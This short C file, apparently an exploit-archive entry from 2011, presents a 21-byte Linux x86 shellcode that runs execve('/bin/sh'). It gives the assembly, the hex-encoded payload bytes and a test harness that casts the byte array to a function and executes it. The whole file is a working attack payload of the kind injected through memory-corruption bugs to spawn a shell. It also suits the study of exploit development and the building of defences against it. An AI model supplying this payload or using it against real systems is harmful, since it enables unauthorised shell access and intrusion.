/*
 Title: linux/x86 Shellcode execve ("/bin/sh") - 21 Bytes
 Date     : 10 Feb 2011
 Author   : kernel_panik
 Thanks   : cOokie, agix, antrhacks
*/

/*
 xor ecx, ecx
 mul ecx
 push ecx
 push 0x68732f2f   ;; hs//
 push 0x6e69622f   ;; nib/
 mov ebx, esp
 mov al, 11
 int 0x80
*/


#include <stdio.h>
#include <string.h>

char code[] = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
              "\x73\x68\x68\x2f\x62\x69\x6e\x89"
              "\xe3\xb0\x0b\xcd\x80";

int main(int argc, char **argv)
{
 printf ("Shellcode length : %d bytes\n", strlen (code));
 int(*f)()=(int(*)())code;
 f();
}